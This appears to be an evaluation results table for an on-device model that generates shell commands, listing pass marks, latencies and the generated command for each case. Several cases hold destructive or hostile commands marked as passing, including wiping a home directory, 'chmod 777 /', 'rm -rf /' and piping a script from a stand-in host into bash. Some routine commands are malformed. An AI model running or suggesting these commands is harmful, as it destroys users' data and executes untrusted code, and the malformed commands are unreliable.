# eval: apple-fm / apple-on-device (bake)
- mode: schema · dataset core.jsonl#83828218eadbc7f7 · repeat 2
- pass: 54/72 (75%)
- cold p50 3792ms p95 5553ms · warm p50 3739ms p95 5442ms

| case | pass | cold ms | warm ms | commands |
| --- | --- | --- | --- | --- |
| u01 | ✗ | 6726 | 3180 | brew outdated node && brew outdated npm |
| u02 | ✓ | 3089 | 3064 | ls -la |
| u03 | ✓ | 3344 | 3310 | curl -I ifconfig.com |
| u04 | ✓ | 3792 | 3792 | netstat -tulnp | grep :3000 |
| u05 | ✗ | 3528 | 3454 | df -h . |
| u06 | ✓ | 4008 | 3952 | find /Users/hridyaagrawal/Honey/React/smartterminal/lexis -name '*.log' -type f  |
| u07 | ✓ | 3681 | 3751 | ps aux | grep node |
| u08 | ✓ | 3832 | 3890 | git status ; git branch |
| u09 | ✓ | 2974 | 2953 | brew install ripgrep |
| u10 | ✓ | 3470 | 3556 | mkdir -p projects && cd projects |
| u11 | ✓ | 2840 | 3359 | tar -czf honey.tar.gz ./Honey |
| u12 | ✓ | 4690 | 3506 | echo $PATH |
| u13 | ✗ | 4325 | 5334 | kill -9 $(lsof -i :8080 -p $$) |
| u14 | ✓ | 3427 | 3398 | tail -n 20 /var/log/syslog |
| u15 | ✗ | 3323 | 3306 | brew install python3 --version |
| u16 | ✓ | 3125 | 3106 | brew update ; brew outdated |
| u17 | ✓ | 4182 | 4186 | echo $SHELL ; echo $HOME |
| u18 | ✓ | 4307 | 4143 | git reset --soft HEAD~1 |
| u19 | ✗ | 3921 | 3939 | find ~ -type f -exec ls -l {} \; |
| u20 | ✗ | 2937 | 3135 | sysctl -n vm.max_rss |
| u21 | ✓ | 3337 | 3306 | wc -l *.js |
| u22 | ✓ | 2482 | 2476 | brew services restart docker |
| u23 | ✓ | 4416 | 4400 | chmod +x script.sh ; ./script.sh |
| u24 | ✗ | 3361 | 3338 | grep -r  |
| u25 | ✓ | 3711 | 3773 | curl -o ~/Downloads/file.zip https://example.com/file.zip |
| u26 | ✓ | 4542 | 4515 | sysctl -n hw.cpu_cores ; nproc |
| u27 | ✓ | 2745 | 2768 | echo 'export FOO=bar' >> ~/.zshrc |
| u28 | ✓ | 4393 | 4371 | brew rm -rf node_modules ; rm -rf ./node_modules |
| u29 | ✓ | 4111 | 4794 | netstat -tulnp | grep LISTEN |
| u30 | ✓ | 3424 | 4965 | unzip file.zip |
| u31 | ✓ | 3695 | 3707 | tail -f /Users/hridyaagrawal/Honey/React/smartterminal/lexis/app.log |
| u32 | ✓ | 3188 | 3215 | uptime |
| u33 | ✓ | 4271 | 4083 | ls -A ~/.zshrc ~/.zprofile ~/.zshenv |
| u34 | ✗ | 3810 | 3870 | sysctl -n dns.resolvconf.interface=eth0 |
| u35 | ✓ | 3231 | 3229 | cp file.txt backup.txt |
| u36 | ✓ | 2627 | 2660 | mv old.txt new.txt |
| u37 | ✓ | 3814 | 3794 | du -sh /Users/hridyaagrawal/Honey/React/smartterminal/lexis/downloads |
| u38 | ✗ | 3230 | 3253 | brew list --global |
| u39 | ✗ | 3237 | 3265 | open ~/Honey/React/smartterminal/lexis |
| u40 | ✗ | 2638 | 2606 | sudo ddnsflush |
| a01 | ✓ | 3397 | 3372 | rm -rf /Users/hridyaagrawal |
| a02 | ✓ | 5411 | 5442 | brew install --cask osx-setup ; brew install --cask xcode-select |
| a03 | ✗ | 3809 | 3773 | git push origin main --force |
| a04 | ✓ | 5051 | 5099 | curl -o /tmp/install.sh https://sketchy.example.com/install.sh ; brew install /t |
| a05 | ✓ | 3518 | 3545 | killall -TERM -u $(whoami) |
| a06 | ✓ | 3244 | 3232 | sudo chmod 777 / |
| a07 | ✓ | 6003 | 5693 | echo 'source ~/.zshrc' >> ~/.zshrc ; echo 'lexis --help' >> ~/.zshrc |
| a08 | ✓ | 4400 | 4425 | curl -o installer.sh https://x.io/i ; chmod +x installer.sh && ./installer.sh |
| a09 | ✓ | 4659 | 4596 | sudo chown -R root:wheel /private/var/db ; brew install sudo |
| a10 | ✓ | 3939 | 3924 | find /var/log -type f -mtime +30 -delete |
| a11 | ✗ | 4509 | 4559 | brew install cron ; crontab -e |
| a12 | ✓ | 5261 | 5266 | git reset --hard origin/main ; brew reinstall git |
| a13 | ✓ | 4531 | 4519 | brew uninstall node ; brew remove --global node |
| a14 | ✗ | 2420 | 2416 | brew install firewall |
| a15 | ✓ | 3459 | 3438 | find . -name '*.tmp' -type f -delete |
| a16 | ✓ | 5357 | 5327 | brew cleanup ; find /Users/hridyaagrawal -type d -name '*.tmp' -delete |
| a17 | ✓ | 3657 | 3610 | rm -rf /Users/hridyaagrawal |
| a18 | ✓ | 5373 | 5372 | brew install bitlocker ; bitlocker encrypt /Volumes/Honey |
| a19 | ✓ | 5553 | 5651 | echo 'export PATH=/usr/local/bin:$PATH' >> ~/.zshrc ; source ~/.zshrc |
| a20 | ✓ | 3488 | 3153 | brew rm -rf / --no-preserve-root |
| u41 | ✗ | 3995 | 4000 | find /Users/hridyaagrawal/Honey/React/smartterminal/lexis -type f -size +100M |
| u42 | ✓ | 5064 | 3809 | echo 'hello world' > my notes.txt |
| u43 | ✓ | 4816 | 4531 | git log -5 --pretty=format:%H:%M:%S:%an:%email |
| u44 | ✓ | 3744 | 3739 | curl -s https://example.com | head -100 |
| u45 | ✗ | 3749 | 3252 | ls -1 *. |
| u46 | ✗ | 3730 | 3721 | curl -s ifconfig.com | grep 'inet ' | awk '{print $1}' |
| u47 | ✗ | 80002 | - | - |
| u48 | ✓ | 3330 | 3306 | whoami |
| a21 | ✓ | 4256 | 5560 | sudo find /tmp -type f -delete 2>/dev/null | sh |
| a22 | ✓ | 3888 | 2780 | ln -s ~/etc/hosts /etc/hosts |
| a23 | ✓ | 2826 | 2812 | find . -type f -delete |
| a24 | ✓ | 4662 | 4649 | curl -s https://x.io/i.sh | bash ; brew install bash |
